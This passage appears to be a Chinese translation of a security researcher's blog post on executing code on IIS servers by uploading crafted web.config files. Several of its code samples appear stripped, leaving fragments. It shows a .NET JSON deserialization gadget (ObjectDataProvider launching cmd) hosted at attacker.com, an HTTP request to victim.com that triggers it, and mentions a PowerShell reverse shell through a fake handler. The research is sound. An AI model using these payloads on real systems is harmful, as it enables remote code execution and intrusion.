### 介绍
这是我上传`web.config`系列文章中的第二篇，我在2014年完成了第一篇该系列的相关文章，在那篇文章中我描述了一种运行`ASP`的经典代码方法，即通过上传`web.config`文件来执行存储型XSS攻击。
在这篇文章中，我们专注于运行`web.config`文件本身，我在上一篇文章中介绍过如何在IIS上的应用程序中上传web.config技术。而本文中我的主要是使用`web.config`文件在服务器上执行代码或命令，并使用了技巧来利用存储型XSS。
此处描述的技术分为两大类，其具体取决于是否可以在应用程序根目录或子文件夹、虚拟目录中上载`web.config`文件。
如果不熟悉IIS中的虚拟目录和应用程序术语，请[参阅](https://docs.microsoft.com/en-us/iis/get-started/planning-your-iis-architecture/understanding-sites-applications-and-virtual-directories-on-iis)。
### 1.使用根目录或应用程序目录中的web.config执行命令
此方法非常具有破坏性，因为应用程序已经使用了将替换为我们的`web.config`文件。然而该文件没有所有必需的设置，例如数据库连接字符串或一些有效的程序集的引用。
当应用程序可能使用了将要替换的`web.config`文件时，建议不要在实时网站上使用此技术。
位于其他应用程序或虚拟目录中的IIS应用程序可能不使用`web.config`文件，通常比网站的根目录更安全。
下面的图中显示了`testwebconfig`应用程序中的内部应用程序anotherapp的示例，该应用程序也位于默认网站内。
如果可以修改应用程序根目录中的`web.config`文件，则可以使用许多方法在服务器上执行命令。
我在这篇博文中列出了四个例子，如下所示。
#### 1.1 将web.config作为ASPX页面执行
这与第一篇文中提到的技术非常相似，但是当我们在应用程序的根目录中上传`web.config`文件时，我们有更多的控制权，我们可以使用托管处理程序将`web.config`文件作为`ASPX`页面运行。
以下`web.config`文件显示了一个示例：
    ")
    ' it is running the ASP code if you can see 3 by opening the web.config file!
    Response.write(1+2)
    Response.write("
    -->
之后我们可以浏览`web.config`文件以将其作为`ASP.NET`页面运行。 然而`XML`内容也可以从网上访问。
也许更容易上传另一个带有允许扩展名的文件，例如`.config`、`.jpg`或`.txt`文件，并将其作为`.aspx`页面运行。
#### 1.2 使用AspNetCoreModule运行命令
我们也可以使用ASP.NET核心模块运行命令，如下所示：
所述命令将通过浏览不需要存在于服务器上的`backdoor.me`页面来执行，这里可以使用`PowerShell`命令作为反向`shell`。
#### 1.3 使用系统秘钥
#### 1.4 使用JSON_AppService.axd
这是在`.NET Framework`中使用已知的反序列化问题在服务器上运行代码的一种方式。
在这种情况下，`web.config`文件如下所示：
以下JSON显示攻击者网站`（http://attacker.com/payload）`上应该接受POST请求的payload页面：
    {
        '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
        'MethodName':'Start',
        'ObjectInstance':{
            '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            'StartInfo': {
                '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                'FileName':'cmd',
                'Arguments':'/c calc'
            }
        }
    }
上传`web.config`文件并在远程服务器上设置payload页面后，攻击者可以发送以下HTTP请求以在服务器上运行其代码和命令：
    POST /testwebconfig/Authentication_JSON_AppService.axd/login HTTP/1.1
    Host: victim.com
    Content-Length: 72
    Content-Type: application/json;charset=UTF-8
    {"userName":"foo","password":"bar","createPersistentCookie":false}
应该注意的是，`Profile_JSON_AppService.axd`或`Role_JSON_AppService.axd`也可能在这里派上用场，但是需要在`web.config`中启用它们，并且需要调用合适的方法来触发反序列化。
### 2.使用子文件夹或虚拟目录中的web.config执行命令
虚拟目录中的`web.config`文件比应用程序文件夹根目录中的`web.config`更受限制。
可以滥用以执行`AspNetCoreModule，machineKey，buildProviders和httpHandler`等命令不能在子文件夹中的web.config中使用。
在我之前在2014年发表的相关博客文章中，我发现了一种方法，当允许在虚拟目录中使用`ISAPI`模块时，将`web.config`文件作为`ASP`文件运行。如下所示：
    ")
    ' it is running the ASP code if you can see 3 by opening the web.config file!
    Response.write(1+2)
    Response.write("
    -->
其他模块（例如用于PHP的模块）也可以在允许时进行类似地使用。 但是，在正确配置IIS应用程序时，我们通常无法运行除`.NET`代码之外的任何内容。
因此，我将引入更多技术。
#### 2.1 错误使用compilerOptions属性
我将使用以下web.config文件作为基本模板：